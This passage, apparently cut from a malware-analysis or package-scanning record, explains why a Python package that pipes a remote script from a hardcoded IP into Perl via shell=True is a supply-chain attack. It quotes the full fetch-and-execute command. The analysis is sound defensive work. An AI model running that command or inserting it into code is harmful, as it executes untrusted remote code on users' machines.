Specifically, it runs 'curl http://13.93.28.37:8080/p | perl -' via subprocess with shell=True, which downloads and immediately executes a remote script from a hardcoded IP address using Perl. This is a textbook example of a supply chain attack: the package executes arbitrary code from an untrusted remote server on the user's machine without their knowledge or consent. There is no input validation, error handling, or legitimate installation logic. The package name and description ('DONT INSTALL THIS') further suggest malicious intent. This pattern is exclusively observed in malware samples and is a critical risk for remote code execution and system compromise.",
